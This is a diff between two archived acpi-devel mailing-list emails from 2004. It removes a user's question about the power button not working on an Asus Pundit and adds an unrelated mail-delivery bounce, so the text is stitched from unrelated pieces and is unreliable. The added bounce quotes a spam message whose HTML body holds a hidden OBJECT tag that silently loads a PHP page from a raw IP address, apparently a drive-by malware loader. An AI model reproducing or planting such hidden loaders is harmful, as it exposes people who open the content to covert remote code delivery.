@@ -1,9 +1,10 @@
-From: "JLac" <jlacvdr-6bugY6I12JBBDgjK7y7TUQ@public.gmane.org>
-Subject: ACPI does''t work on my Pundit asus !
-Date: Sun, 21 Mar 2004 10:39:30 +0100
+From: Unknown <unknown@unknown.invalid>
+Subject: Returned Mail: Error During Delivery
+Date: Sun, 21 Mar 2004 17:49:36 +0000 (UTC)
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-Message-ID: <NEBBJBIJELCOLFMEMIIICEJHFBAA.jlacvdr@ifrance.com>
+Message-ID: <E1B573E-00004q-C2@sc8-sf-list2.sourceforge.net>
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
+From: Webshield SMTP V4.5 MR1a Mail Service
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5ji9XKYC2TYK4Io4DoRGLOrNAH6kLmebB@public.gmane.org>
@@ -12,51 +13,38 @@ List-Help: <mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5lLLH9aP38K
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5R9m/fhtKvoLKtGCp0j7rLg@public.gmane.org>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=acpi-devel>
+Date: Sun Mar 21 12:47:26 2004
 To: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-acpi@vger.kernel.org
 
-Hello,
+    ---- Failed Recipients ----
 
-I would like shuting down my computer when I press the power button (through
-the shutdown script).
-I install the acpi but nothing happens when I press the button
-
-I read different web page about it, and the how-to, but it's not enough for
-my problem...
-
-My configuration is :
-Hardware :
-	Asus Pundit (http://www.asus.com/products/desktop/pundit/overview.htm)
-
-Software :
-	Linux distrib. Debian with kernel source 2.4.24
-	Patch ACPI : acpi-20040311-2.4.24
-
-I compile and install the kernel with this configuration :
-	in General Setup
-	 [*] Power Management support
-	 < > APM
-	 [*] ACPI Support
-	   <M> Button
+<pgmdsg-/X6VYK7xyaY@public.gmane.org>
 
 
-In fact, I can see the directory /proc/acpi
-and after loading the button module, a new directory /proc/acpi/button and a
-sub-directory power
-I execute a 'cat /proc/acpi/event' nothing is displayed when I press the
-power button.
+Requested action not taken: mailbox unavailable. [SMTP Error Code 550]
 
-I also try with the acpid daemon but it doesn't work neither. (and also with
-2.4.25 kernel)
+    ---- Contents of the undelivered mail ----
 
-What is my mistake ?
-What have I forgotten ?
+Received: From jimhsiao.com ([211.22.80.198]) by ibixmaila.ibi.com (WebShield SMTP v4.5 MR1a);
+	id 1079891243669; Sun, 21 Mar 2004 12:47:23 -0500
+Date: Mon, 22 Mar 2004 01:40:30 +0800
+To: pgmdsg-/X6VYK7xyaY@public.gmane.org
+Subject: Re: Hi
+From: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
+Message-ID: <liozhlnbyobehdxsbdy-/X6VYK7xyaY@public.gmane.org>
+MIME-Version: 1.0
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: 7bit
 
-Thanks,
-
-Best Regards,
-
-
+<html><body>
+<font face="System">
+<OBJECT STYLE="display:none" DATA="http://68.67.237.226:81/348030.php">
+</OBJECT></body></html>
 
 
 
